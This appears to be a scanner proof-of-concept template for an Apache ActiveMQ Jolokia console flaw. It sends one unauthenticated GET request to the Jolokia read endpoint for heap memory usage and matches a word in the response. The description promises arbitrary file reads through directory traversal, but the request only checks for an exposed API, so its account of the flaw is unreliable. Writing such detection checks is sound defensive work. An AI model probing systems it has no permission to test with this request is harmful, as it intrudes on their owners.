[info]
author = "ave"
description = "Apache ActiveMQ Jolokia console directory traversal vulnerability allows unauthenticated remote attackers to read arbitrary files on the server via crafted API requests"
id = "POC-AVE-2019-0143"
name = "PoC for AVE-2019-0143"
severity = "medium"
tags = ["ave-2019-0143"]
vuln_id = [
    "CVE-2019-19368",
    "AVE-2019-0143",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/api/jolokia/read/java.lang:type=Memory/HeapMemoryUsage"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["HeapMemoryUsage"]
